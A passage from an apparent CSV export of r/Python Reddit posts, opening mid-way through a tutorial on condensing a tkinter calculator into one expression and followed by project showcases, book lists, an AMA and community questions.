* it doesn't make much sense to increment the row and column of the buttons when creating them, the `bt_draw` function should be called with the correct arguments;
* we add some width to the buttons when we create them, otherwise the calculator looks *really* bad (might be because of my operating system).

We get this:

    import tkinter as tk
    
    def bt_draw(key, col, lin):
        bt = tk.Button(window, text=key, command=lambda: bt_press(key), width=5)
        bt.grid(column=col, row=lin)
        return bt
    
    def bt_press(key):
        if   key == ""C"": disp[""text""] = """"
        elif key == ""<"": disp[""text""] = disp[""text""][:-1]
        elif key == ""="": disp[""text""] = str(round(eval(disp[""text""]), 6))
        else           : disp[""text""] += key
    
    window = tk.Tk()
    window.title(""TKalc"")
    
    disp = tk.Label(window, text="""")
    disp.grid(column=0, row=0, columnspan=5)
    
    keys = ""()C<789/456*123-.0=+""
    bt_list = [bt_draw(k, n%4 + 1, n//4 + 1) for n, k in enumerate(keys)]
    
    window.mainloop()

Now on to rewriting everything as a single expression. First I rewrote the functions as lambdas, which means right from the start that I have to use [Boolean short-circuiting](https://mathspp.com/blog/pydonts/boolean-short-circuiting) to be able to stuff different expressions together.

The first function was:

    def bt_draw(key, col, lin):
        bt = Button(window, text=key, command=lambda: bt_press(key), width=5)
        bt.grid(column=col+1, row=lin+1)
        return bt

and became

    bt_draw = lambda k, c, l: (bt := Button(w, text=k, command=lambda: bt_press(k), width=5)) and bt.grid(column=col, row=lin)

Notice that assignments are statements, not expressions, so we need to use [assignment expressions with the walrus operator](https://mathspp.com/blog/pydonts/assignment-expressions-and-the-walrus-operator) if we want to inline assignments. We don't really need to return the button for any reason, so we can just ignore the `return bt` statement, otherwise we would end our lambda with `or bt`.

The second function is a little bit more work because the `if`\-`elif` statements need to be rewritten as conditional expressions. On top of that, `disp[""text""]` can't be the left-hand side of an assignment expression, so we need to work this out in some other way... just call the `config` function!

We go from

    def bt_press(key):
        if   key == ""C"": disp[""text""] = """"
        elif key == ""<"": disp[""text""] = disp[""text""][:-1]
        elif key == ""="": disp[""text""] = str(round(eval(disp[""text""]), 6))
        else           : disp[""text""] += key

to

    update = lambda t: d.config(text=t)
    bt_press = lambda k: update("""") if k == ""C"" else update(d[""text""][:-1]) if k == ""<"" else update(str(round(eval(d[""text""]), 6))) if k == ""="" else update(d[""text""] + k)

Notice that we also factored out the ""update"" part of the logic into a single function, to separate concerns. If we later change how text is displayed, it becomes more manageable to also update the way in which we update the text, we just need to fix the `update` function.

At this point, this is the program:

    import tkinter as tk
    bt_draw = lambda k, c, l: (bt := tk.Button(w, text=k, command=lambda: bt_press(k), width=5)) and bt.grid(column=c, row=l)
    update = lambda t: d.config(text=t)
    bt_press = lambda k: update("""") if k == ""C"" else update(d[""text""][:-1]) if k == ""<"" else update(str(round(eval(d[""text""]), 6))) if k == ""="" else update(d[""text""] + k)
    w = tk.Tk()
    w.title(""TKalc"")
    d = tk.Label(w, text="""")
    d.grid(column=0, row=0, columnspan=5)
    keys = ""()C<789/456*123-.0=+""
    bt_list = [bt_draw(k, n%4 + 1, n//4 + 1) for n, k in enumerate(keys)]
    w.mainloop()

The final hassle is the `tkinter` import, because we are currently using an import *statement*... However, we can easily fix that with the `__import__` built-in:

    tk = __import__(""tkinter"")

Now we just chain everything together in a single expression with `and`s and `or`s. All the assignments are changed into `:=` and chained together with `and`s. After calls to functions that don't return anything, for example the `.grid()` methods, we use `or`s to keep the program going.",https://www.reddit.com/r/Python/comments/ojab0n/i_see_your_17_loc_calculator_and_i_raise_you_a/,89,703
jsl568,Simple Python Tutorial for Robinhood API,,https://youtu.be/C5buU4zjjx0,51,706
gahjjm,Tab vs Spaces,,https://i.redd.it/e8k3k4u0nqv41.png,75,705
anfdyh,Free Python books,"I recently started learning Python and I’ve come across several great resources, including a number of ebooks that can be read online or downloaded for free. Some are well known, others less. Here’s the list of those books:

* [Python 101](https://python101.pythonlibrary.org/)
* [A Python Book: Beginning Python, Advanced Python, and Python Exercises](http://www.davekuhlman.org/python_book_01.html)
* [Boxes: Your Second Python Book](http://ralsina.gitlab.io/boxes-book/)
* [The Hitchhiker’s Guide to Python!](https://docs.python-guide.org/)
* [Automate the Boring Stuff with Python](https://automatetheboringstuff.com/)
* [Problem Solving with Algorithms and Data Structures using Python](https://interactivepython.org/runestone/static/pythonds/index.html#problem-solving-with-algorithms-and-data-structures-using-python)
* [Python for Scientists and Engineers](https://www.pythonforengineers.com/python-for-scientists-and-engineers/)
* [Think Python: How to Think Like a Computer Scientist](https://greenteapress.com/wp/think-python-2e/)
* [Clean Architectures in Python](https://leanpub.com/clean-architectures-in-python)
* [Teaching and Learning with Jupyter](https://jupyter4edu.github.io/jupyter-edu-book/)

What are your favorite free Python books?

&#x200B;

**Update 2**: [the list is now available on GitHub](https://github.com/pamoroso/free-python-books).

**Update 1**: thanks all for the appreciation, feedback, and additional book suggestions.",https://www.reddit.com/r/Python/comments/anfdyh/free_python_books/,84,701
phqhlz,I made a Twitch Live Stream Highlights Detector in Python!,"Hi! Recently I graduated with a Bachelor of Software Engineering degree and as far as my main interest is Machine Learning I decided to create something cool (and maybe useful) with the help of Python as my graduation project. 
The main idea behind the app is to automatically find “interesting” moments from the live stream on Twitch. For this task, I trained a combination of models for highlight detection from short video clips and created a handy interface in Django. The app works fine on shooters only, as far as the training data consisted only of shooter clips. Hope you will like it :)
I shared all the technical details on the [Github page](https://github.com/artkulak/twitch-stream-highlights-detection) and in the [blog post](https://artkulakov.medium.com/how-i-created-an-app-for-live-stream-highlight-detection-for-twitch-532f4027987e)",https://www.reddit.com/r/Python/comments/phqhlz/i_made_a_twitch_live_stream_highlights_detector/,7,701
lppsep,Python & APIs: A Winning Combo for Reading Public Data – Real Python,,https://realpython.com/python-api/,21,697
knbv5t,Ditching Excel for Python - Lessons Learned from a Legacy Industry,,https://amypeniston.com/ditching-excel-for-python/,130,703
c6l335,I invented my own numbering system and programmed a clock in Python which uses it.,,https://v.redd.it/6zqi3f7204731,74,699
anbjyx,"Honestly, just sharing because I'm stoked I figured this out on my own, even though it's very simple.",,https://i.redd.it/nme2aus35pe21.jpg,76,697
jqxhzs,I made a web application to watch all the videos of a YouTube playlist/channel on the same page.," 

Ever wanted to watch a playlist of programming tutorial with peace, but had to keep loading different videos to refer something from the previous video or open ten tabs and get overwhelmed just to keep track of them?

I made a web application using Flask which takes a list of playlist links or channel links or a mix of both and spits out the videos from them on the same page, no extra tabs.

Link to the app: [MultiTube](https://getmultitube.netlify.app/)

All you have to do is give it a comma-separated list of different video links, playlist links or channel links. You can even remove any video which you have completed or scale them up to a larger width.

Ex: [https://www.youtube.com/watch?v=iik25wqIuFo](https://www.youtube.com/watch?v=iik25wqIuFo), [https://www.youtube.com/playlist?list=PLu8EoSxDXHP6CGK4YVJhL\_VWetA865GOH](https://www.youtube.com/playlist?list=PLu8EoSxDXHP6CGK4YVJhL_VWetA865GOH), [https://www.youtube.com/channel/UCCezIgC97PvUuR4\_gbFUs5g](https://www.youtube.com/channel/UCCezIgC97PvUuR4_gbFUs5g)

Source code: [https://github.com/SrikarKSV/MultiTube](https://github.com/SrikarKSV/MultiTube)

You can find all the features on GitHub or ask me in the comments! Any feedback would be appreciated.",https://www.reddit.com/r/Python/comments/jqxhzs/i_made_a_web_application_to_watch_all_the_videos/,39,700
cw13a9,"""Excellent Python Programmers wanted, numpties need not apply""",,https://i.redd.it/cug4006r2yi31.jpg,170,700
asltnr,"Today is python birthday, what do you wish?","First message of Guido releasing python was the 20 February 1991 on alt.sources.
What would you like to wish for the  28y of python?

I would love to see no more 2.7 code around. ",https://www.reddit.com/r/Python/comments/asltnr/today_is_python_birthday_what_do_you_wish/,280,698
9liqbe,Generating an image containing all possible colors (in 24-bit) using hilbert curves in python,,https://i.redd.it/ioszzoswaaq11.png,25,700
90acd6,Python has brought computer programming to a vast new audience,,https://www.economist.com/science-and-technology/2018/07/21/python-has-brought-computer-programming-to-a-vast-new-audience,122,697
12j68f7,"If you're a beginner interested in data science and machine learning, I recently produced a video series that goes through all of the major algorithms and their implementations in Python! I put a lot of work into each tutorial, so hopefully this helps out!",,https://www.youtube.com/playlist?list=PLvICEeb-TZEHKkojcv1_POKPrCwlsEnsI,25,696
117xcbj,After using Python for over 2 years I am still really confused about all of the installation stuff and virtual environments,"When I learned Python at first I was told to just download the Anaconda distribution, but when I had issues with that or it just became too cumbersome to open for quick tasks so I started making virtual environments with venv and installing stuff with pip. Whenever I need to do something with a venv or package upgrade, I end up reading like 7 different forum posts and just randomly trying things until something works, because it never goes right at first.

Is there a course, depending on one's operating system, on best practices for working with virtual environments, multiple versions of Python, how to structure all of your folders, the differences between running commands within jupyter notebook vs powershell vs command prompt, when to use venv vs pyvenv, etc.? Basically *everything else* right prior to the actual Python code I am writing in visual studio or jupyter notebook? It is the most frustrating thing about programming to me as someone who does not come from a software dev background.",https://www.reddit.com/r/Python/comments/117xcbj/after_using_python_for_over_2_years_i_am_still/,312,693
g1p4ce,Visualising Dijkstra vs DFS vs A* pathfinding algorithms,,https://v.redd.it/aysotawjgys41,52,699
btfqxb,"""Automate the Boring Stuff"" author is live streaming Python programming on Monday evening 5/27, 6pm Pacific","Hi Reddit! I'll be live streaming myself working on a few different text-based games in Python on Monday, 5/27 at 6pm Pacific:

https://www.twitch.tv/alsweigart/

I'm creating a collection of short, complete, text-based Python games. The idea is to create several examples for beginner/intermediate programmers to look at to see how programming concepts come together into a complete program (while still being small enough to understand). The current collection is on GitHub at: https://github.com/asweigart/PythonStdioGames/tree/master/src/",https://www.reddit.com/r/Python/comments/btfqxb/automate_the_boring_stuff_author_is_live/,24,698
6p5qjt,A San Francisco Startup Called Kite Took Over and Made Invasive Changes to autocomplete-python and at Least One Other Atom Plugin,,https://theoutline.com/post/1953/how-a-vc-funded-company-is-undermining-the-open-source-community,110,691
m2r7oi,"Why are there so few ""automation expert"" businesses that provide automation to small and medium sized businesses? Would this style of business be profitable?","I'm not sure if that's a stupid question but considering how much time, and therefore money, some simple scripts could save the average business I don't understand why I don't see ""X Automation Services"" everywhere.

Before I knew any programming I worked for a small company that sold hundreds of second hand items via their own website and eBay. They spent at least 2 hours a day posting/deleting products and making sure everything matched between the two sites. That's over 40 hours a month that could be saved by a relatively simple Beautiful Soup/Selenium solution.

These scenarios are not rare, any business I've ever known has repetitive tasks that can be automated and save countless hours in the long run. Even if there is a relatively simple solution on the market you could at least direct them to that service and charge a consultation fee and even help implement it. Something like Zapier, which seems obvious to us, is intimidating to some of the less tech savvy small business owners. Simply setting up a few useful Zaps would warrrent a decent fee IMO.

One thing I haven't figured out is how you would go about pricing. For my above example let's say my script could save the owner £4,000 a year — what is a reasonable one off fee? The other option is to charge monthly but that would be difficult if you are going to just hand over a script with a batch file or something.

I really love the idea of starting a business that does this but I don't know if it is likely to succeed considering there are so few out there. Am I missing something?",https://www.reddit.com/r/Python/comments/m2r7oi/why_are_there_so_few_automation_expert_businesses/,215,694
4wbky1,"The PyPy project gets $200,000 from Mozilla",,https://blog.mozilla.org/blog/2016/08/04/mozilla-awards-585000-to-nine-open-source-projects-in-q2-2016/,95,693
sb4m4m,"I have made spongebob-cli, watch classic spongebob from your terminal! ☂️","This is the github repo for spongebob-cli :  [https://github.com/trakBan/spongebob-cli](https://github.com/trakBan/spongebob-cli)

How does it work: It scrapes [megacartoons.net](https://megacartoons.net) for mp4 links and displays them as numbers. When you type a number it will play that video.

There are many options with one of them being downloading the video!

[example of the program when run](https://i.redd.it/vg23b78taid81.gif)",https://www.reddit.com/r/Python/comments/sb4m4m/i_have_made_spongebobcli_watch_classic_spongebob/,41,691
kknr91,I made a twitter bot that reminds you of stock predictions,"It's been a lot of fun building this bot. I used tweepy, alpha vantage and heroku and I've written about the implementation in more depth in the following medium article:

[https://luisgc93.medium.com/building-a-stock-reminder-twitter-bot-with-python-and-alpha-vantage-api-24189566e705](https://luisgc93.medium.com/building-a-stock-reminder-twitter-bot-with-python-and-alpha-vantage-api-24189566e705)

The bot can be found at [https://twitter.com/stock\_reminder](https://twitter.com/stock_reminder) and the project's repo is [https://github.com/luisgc93/stock\_reminder\_bot](https://github.com/luisgc93/stock_reminder_bot). I've added some issues if anyone would be interested in contributing. All feedback is welcome!

Here's a couple of screenshots of the bot in use:

https://preview.redd.it/6hnk86kd8l761.png?width=1320&format=png&auto=webp&s=e9afc8870d221cd7adf0e5eb24d1be3857993470

https://preview.redd.it/hejb3548xk761.jpg?width=1320&format=pjpg&auto=webp&s=240f811a4b92faaad1b58dc882af048eb6d7a6c4

UPDATE:

Wow, thanks everyone for the feedback. I went to bed hoping a couple of people max would find this interesting! Your comments have been super useful and the fact that some of you went out and used the bot has also made me see some of the current limitations:

1. Stock splits are not currently supported. If a user generates a reminder for a stock that  undergoes a split before the reminder date, the results will show a large decrease in stock price, when this might not be the case. EDIT - stock splits now supported!
2. Similarly, the returns % is calculated without accounting inflation or dividends
3. The bot doesn't quite support intra-day trading. So a mention like ""Remind me of $BTC in one hour"" will generate the initial reply but the bot won't trigger the reminder unless the bot is mentioned before midday UTC.

\*I've now added support for stock splits:

https://preview.redd.it/nvtibqrt8s761.png?width=1322&format=png&auto=webp&s=c06b1ec7a5b5d12bd1bb55b0db9d76f33fa083e4",https://www.reddit.com/r/Python/comments/kknr91/i_made_a_twitter_bot_that_reminds_you_of_stock/,27,694
fpjiba,Create augmented reality plots over the web with Flask,,https://gfycat.com/femaledentalewe,24,694
q8fdfp,"""Give me one example of something you can do in pandas that you can't do in excel""",My friend the other day at work. He just got fired,https://www.reddit.com/r/Python/comments/q8fdfp/give_me_one_example_of_something_you_can_do_in/,303,694
k32p48,"Cyberbrain: Python debugging, redefined","# [https://github.com/laike9m/Cyberbrain](https://github.com/laike9m/Cyberbrain)

Cyberbrain is a debugging solution that aims to free programmers. It lets you:

* **Backtraces variable changes**.
* See **every state** of program execution, including **variables' values**
* **Debug loops** with confidence.

It's not like any triditional debuggers. Instead of  stepping through a program, Cyberbrain can tell you what happened.

It's a WIP, the ultimate goal is to be a replacement for existing debuggers in most cases.

https://preview.redd.it/ehw9erc8s3261.png?width=1224&format=png&auto=webp&s=fe041c8f6efbea38c503e03200ed5b1538b8e035

[usage](https://i.redd.it/zkiwtdrgs3261.gif)",https://www.reddit.com/r/Python/comments/k32p48/cyberbrain_python_debugging_redefined/,56,689
y9u87s,Can we stop creating docker images that require you to use environments within them?,"I don't know who out there needs to hear this but I find it absolutely infuriating when people publish docker images that require you to activate a venv, conda env, or some other type of isolation within a container that is already an isolated unique environment.

Yo dawg, I think I need to pull out the xzibit meme...",https://www.reddit.com/r/Python/comments/y9u87s/can_we_stop_creating_docker_images_that_require/,262,688
mlbo2m,"I am excited to share my 9th published book, Pillow: Image Processing with Python","I made several of the chapters of the book into articles on my blog so you can get a preview of the content in the book:

* [Drawing Shapes on Images with Python and Pillow](https://www.blog.pythonlibrary.org/2021/02/23/drawing-shapes-on-images-with-python-and-pillow/)
* [Drawing Text on Images with Pillow and Python](https://www.blog.pythonlibrary.org/2021/02/02/drawing-text-on-images-with-pillow-and-python/)
* [Getting GPS EXIF Data with Python](https://www.blog.pythonlibrary.org/2021/01/13/getting-gps-exif-data-with-python/)

[Mike Driscoll signing copies of Pillow: Image Processing with Python](https://preview.redd.it/15tt5xx91kr61.jpg?width=3405&format=pjpg&auto=webp&s=c9a32acc24202796b05ff1de2c0eaccf4ec5351c)

In this book, you will learn about the following:

* Opening and saving images
* Extracting image metadata
* Working with colors
* Applying image filters
* Cropping, rotating, and resizing
* Enhancing images
* Combining images
* Drawing with Pillow
* ImageChops
* Integration with GUI toolkits

You can order the eBook versions on [Leanpub](https://leanpub.com/pillow/) or [Gumroad](https://gum.co/pypillow). When you purchase through either of these websites, you will receive a PDF, epub and mobi version of the book.

The paperback and Kindle versions are now available on [Amazon](https://kdp.amazon.com/amazon-dp-action/us/dualbookshelf.marketplacelink/B08ZCQM1C1).

The paperback version of the book is in **full color**. That is why it more expensive than any of my other books to purchase.",https://www.reddit.com/r/Python/comments/mlbo2m/i_am_excited_to_share_my_9th_published_book/,27,689
824z5w,I wrote a script which goes through my LastPass vault and checks all passwords against haveibeenpwned.com and I hope somebody else finds it useful,,https://github.com/dionysio/haveibeenpwned_lastpass,123,686
64j4oj,Practice algorithms and data structures (and prep for coding interviews) with interactive coding challenges in Python,,https://github.com/donnemartin/coding,12,686
16m0yqk,"[AMA] I am Al Sweigart, author of ""Automate the Boring Stuff with Python"" and other books. Ask me anything!","Hello, r/Python

I'm Al Sweigart, the author of Automate the Boring Stuff with Python, The Recursive Book of Recursion, Invent Your Own Computer Games with Python, and several other programming books for beginners. All of my books are freely available under a Creative Commons license on my website, https://inventwithpython.com

I'm currently working on the 3rd edition of Automate the Boring Stuff, which will have new chapters on SQLite databases, text-to-speech, optical character recognition, speech recognition, and how to use AI to help you learn to code (spoiler: it's mostly hype, but there's some utility there.)

Ask me anything, and good luck on your programming journey!

EDIT: Thanks to everyone for their questions. Okay, time for me to stop procrastinating on Reddit and get back to writing. Thanks!",https://www.reddit.com/r/Python/comments/16m0yqk/ama_i_am_al_sweigart_author_of_automate_the/,196,636
13heek6,Real Multithreading is Coming to Python - Learn How You Can Use It Now,,https://betterprogramming.pub/real-multithreading-is-coming-to-python-learn-how-you-can-use-it-now-90dd7fb81bdf,116,618
111y9o2,Python projects with best practices on Github?,"I'm always finding ways to upskill my coding skills with Python and write refactored code the right way. After just diving deep into Python, I've been looking around Github for Python projects that are examples of best practices and ones with a strong and well built architecture. I want ones that are organized and have proper documentation.

Finding the ones that I really want might take some time, and I might end up getting something I don't want in the end. However, I did notice a few mentions of certain well-known ones in the sub. So with that being said, the ones that I believe match what I'm searching for are these repos:

* [DocArray](https://github.com/docarray/docarray): It’s a nested multimodal data structure library.
* [scikit-learn](https://github.com/scikit-learn/scikit-learn): A machine learning module for SciPy.
* [Production Tools](https://github.com/thuijskens/production-tools): It’s a python repo used for data science projects.
* [Requests](https://github.com/psf/requests): Simple HTTP library for Python.

If you've got any more links to  that you think would be worth checking out, that would be nice. Thanks in advance to anyone who can suggest.",https://www.reddit.com/r/Python/comments/111y9o2/python_projects_with_best_practices_on_github/,69,581
